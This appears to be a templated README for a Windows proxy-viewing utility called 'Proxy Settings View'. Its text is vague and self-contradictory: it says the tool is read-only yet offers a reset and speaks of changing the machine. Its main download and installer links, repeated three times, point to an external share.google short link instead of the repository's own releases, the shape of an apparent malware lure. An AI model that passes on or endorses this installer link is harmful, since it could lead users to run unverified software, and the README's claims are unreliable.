![Proxy Settings View](assets/hero.png)

# Proxy Settings View

*What proxy this user actually has.*

## Overview

This repository is **Proxy Settings View**, a network utility. What proxy this user actually has.

A 'direct' feeling is often a leftover proxy.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- WinHTTP and user
- Read-only
- Optional reset if you pass --reset
- Prints PAC if set

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/martha9636/proxy-settings-view

MIT license. See `LICENSE`.
